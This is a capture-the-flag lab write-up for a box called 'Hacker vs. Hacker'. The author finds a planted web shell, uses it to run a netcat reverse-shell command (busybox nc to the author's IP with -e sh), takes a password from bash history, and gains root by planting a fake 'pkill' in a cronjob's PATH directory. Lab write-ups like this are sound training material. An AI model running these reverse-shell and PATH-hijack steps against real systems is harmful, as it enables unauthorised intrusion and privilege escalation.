# Hacker vs. Hacker

### Hacker vs. Hacker
Nmap scan shows ports 22 and 80 open. The source code of the main webpage shows the presence of a `/csv` directory:<br />
![image](https://github.com/user-attachments/assets/8dc997ce-8542-4ec0-933d-af2ce39c21c6)<br />
On the bottom of the page there's an `upload cv` feature, which redirects to an `upload.php` page. The source code fo this page contains a hint:<br />
![image](https://github.com/user-attachments/assets/1f74367f-0670-4aac-9716-aac4e0601022)<br />
So my guess is that the hackers uploaded a shell inside `/cvs/`. I started enumerating manually, and I swear to god I didn't expect to find it, but I found the shell at `http://10.10.199.192/cvs/shell.pdf.php`. I was really lucky. I'm gonna use it to spawn a reverse shell.<br />
I open a netcat listener on port 9001 and browse `http://10.10.199.192/cvs/shell.pdf.php?cmd=busybox nc 10.14.90.188 9001 -e sh`. But something weird happens. When I try to access the rest of the file system, I get blocked with a "nope" message:<br />
![image](https://github.com/user-attachments/assets/35b0d8f4-2b3d-49b2-ba89-8a9f21780cdc)<br />
This got me user.txt. Inside the home directory of the user, I can read the bash_history file:<br />
![image](https://github.com/user-attachments/assets/2696502b-1d1e-4219-8ddd-d7a5d88ab061)<br />
Also, I understand now why I can't stabilize my shell:<br />
![image](https://github.com/user-attachments/assets/6b1cb1ed-afc9-4773-a276-e973c48bb1b7)<br />
Essentially I can't even connect with ssh, even if I know the password. Basically since the PATH variable of this cronjob starts at `/home/lachlan/bin`, and since the command performed by root executes `pkill` with the relative path, I can exploit this and
create a file called `pkill` inside `/home/lachlan/bin`, but this time it will contain a reverse shell to me. So I put a reverse shell in a local file called `pkill`, and then run `scp pkill lachlan@10.10.199.192:bin/` using the password saw in the history file. The problem now is that this file is not executable, I have to give it execute permission. <br />
I don't know if it's the best way, but I joined ssh and I used that 2 seconds time span that I had before I got kicked to run `chmod +x bin/pkill`. The command is executed, and I get the reverse root shell! 




